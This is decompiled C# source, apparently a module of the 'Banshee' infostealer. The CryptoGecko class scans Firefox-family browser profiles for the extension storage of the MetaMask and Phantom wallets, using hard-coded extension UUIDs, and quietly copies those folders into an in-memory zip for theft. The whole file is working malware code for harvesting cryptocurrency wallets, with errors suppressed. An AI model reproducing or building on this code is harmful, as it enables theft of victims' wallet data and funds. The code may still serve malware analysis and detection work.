﻿using System;
using System.Collections.Generic;
using System.IO;
using System.Threading.Tasks;
using Banshee.Helper.Data;

namespace Banshee.Targets.Browsers
{
	// Token: 0x02000081 RID: 129
	public class CryptoGecko : ITarget
	{
		// Token: 0x06000185 RID: 389 RVA: 0x0000CFD8 File Offset: 0x0000CFD8
		public void Collect(InMemoryZip zip, Counter counter)
		{
			Parallel.ForEach<string>(Paths.Gecko, delegate(string browser)
			{
				if (Directory.Exists(browser))
				{
					Parallel.ForEach<string>(Directory.GetDirectories(browser), delegate(string profile)
					{
						string browsername = Paths.GetBrowserName(browser);
						string profilename = Path.GetFileName(profile);
						Task.Run(delegate()
						{
							this.GetGeckoWallets(zip, counter, profile, profilename, browsername);
						});
					});
				}
			});
		}

		// Token: 0x06000186 RID: 390 RVA: 0x0000D018 File Offset: 0x0000D018
		private void GetGeckoWallets(InMemoryZip zip, Counter counter, string profilePath, string profilename, string browserName)
		{
			string extensionsPath = Path.Combine(profilePath, "storage", "default");
			if (!Directory.Exists(extensionsPath))
			{
				return;
			}
			Parallel.ForEach<string[]>(this.GeckoWalletsDirectories, delegate(string[] walletInfo)
			{
				string str = walletInfo[1];
				foreach (string text in Directory.GetDirectories(extensionsPath, "moz-extension+++" + str + "*", SearchOption.TopDirectoryOnly))
				{
					try
					{
						string text2 = ZipPath.Wallets(Path.Combine(browserName, walletInfo[0], walletInfo[1]));
						zip.AddDirectoryFiles(text, text2, true);
						counter.CryptoChromium.Add(text + " => " + text2);
					}
					catch
					{
					}
				}
			});
		}

		// Token: 0x04000149 RID: 329
		private readonly List<string[]> GeckoWalletsDirectories = new List<string[]>
		{
			new string[]
			{
				"Metamask Wallet",
				"7d61b592-e488-4f55-bf12-8d0ae55fd100"
			},
			new string[]
			{
				"Metamask Wallet",
				"bb29e575-946e-4e69-b956-f73aec0a9927"
			},
			new string[]
			{
				"Phantom Wallet",
				"e212a176-a331-462c-a024-d2f9027f15fc"
			},
			new string[]
			{
				"Phantom Wallet",
				"a02b2aab-5dca-4649-93cf-f6a34860fbd5"
			}
		};
	}
}
